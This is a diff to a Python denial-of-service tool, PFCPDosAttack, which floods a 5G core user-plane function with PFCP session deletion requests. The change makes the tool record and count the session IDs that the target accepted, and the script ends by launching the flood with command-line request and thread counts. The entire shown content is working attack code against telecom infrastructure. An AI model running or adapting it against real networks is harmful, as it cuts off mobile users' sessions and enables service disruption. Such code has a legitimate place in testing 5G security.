@@ -335,6 +335,7 @@ class PFCPDosAttack:
         self.smf_addr = smf_addr
         self.SESSION_CONTEXT_NOT_FOUND = 65
         self.REQUEST_ACCEPTED = 1
+        self.valid_seid_list = list()
         
     def set_random_far_number(self, random_far_number=15):
         self.random_far_number = random_far_number
@@ -485,6 +486,7 @@ class PFCPDosAttack:
                     
                 if response == self.REQUEST_ACCEPTED:
                     print(f"[DoS][Worker] PFCP session deletion request accepted; SEID: {hex(i+1)}")
+                    self.valid_seid_list.append(i+1)
                     
             except Exception as e:
                 print(f"[DoS][Worker] Error sending PFCP session deletion request: {e}") 
@@ -515,7 +517,8 @@ class PFCPDosAttack:
         end_time = time.time()
         duration = end_time - start_time
         pps = reqNbr / duration if duration > 0 else float("inf")
-        print(f"[DoS] Sent {reqNbr} packets in {duration:.2f} seconds ({pps:.2f} pps)")
+        print(f"[DoS] Sent {reqNbr} session deletion packets in {duration:.2f} seconds ({pps:.2f} pps)")
+        print(f"[DoS] {len(self.valid_seid_list)} valid SEIDs found ({count / len(self.valid_seid_list)*100}%)")
         
     
     def Start_pfcp_session_establishment_flood(self, reqNbr=100, num_threads=1):
@@ -640,3 +643,6 @@ class PFCPDosAttack:
 objet_dos = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
 objet_dos.set_verbose(True)
 objet_dos.Start_pfcp_session_deletion_flood(reqNbr=int(sys.argv[1]), num_threads=int(sys.argv[2]))
+
+
+
